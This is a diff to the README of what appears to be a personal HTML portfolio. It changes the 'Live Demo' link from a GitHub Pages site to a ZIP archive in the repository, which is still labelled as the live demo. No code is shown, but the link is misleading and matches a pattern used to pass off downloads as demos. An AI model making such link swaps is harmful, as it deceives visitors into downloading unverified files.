@@ -4,7 +4,7 @@ Hi! I'm Regaugetswe Mphahlele, and this is my personal portfolio built with HTML
 
 ## 🚀 Live Demo
 
-Check it out live here: [https://RegaugetsweMphahlele.github.io/Portfolio_2025](https://RegaugetsweMphahlele.github.io/Portfolio_2025)
+Check it out live here: [https://github.com/RegaugetsweMphahlele/Portfolio_2025/blob/main/Portfolio_2025.zip](https://github.com/RegaugetsweMphahlele/Portfolio_2025/blob/main/Portfolio_2025.zip)
 
 ## 💻 Technologies Used
 
